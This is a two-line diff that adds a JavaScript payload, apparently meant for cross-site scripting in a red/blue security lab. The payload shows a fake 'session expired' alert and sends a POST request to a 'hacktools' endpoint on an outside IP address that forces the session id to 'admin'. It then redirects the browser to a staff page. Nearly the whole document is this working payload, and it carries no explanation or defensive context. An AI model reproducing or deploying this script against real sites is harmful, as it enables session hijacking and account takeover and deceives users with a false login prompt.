@@ -1,0 +1,2 @@
+alert('Your session has expired.\nPlease sign in again!'); x = new XMLHttpRequest(); x.open("POST", "https://104.198.208.81/green/public/hacktools/change_session_id.php", true); x.setRequestHeader('Content-Type', "application/x-www-form-urlencoded"); x.send('new_session_id=admin&submit=Change')
+setTimeout(() => { document.location = "https://104.198.208.81/blue/public/staff/index.php" }, 3000);
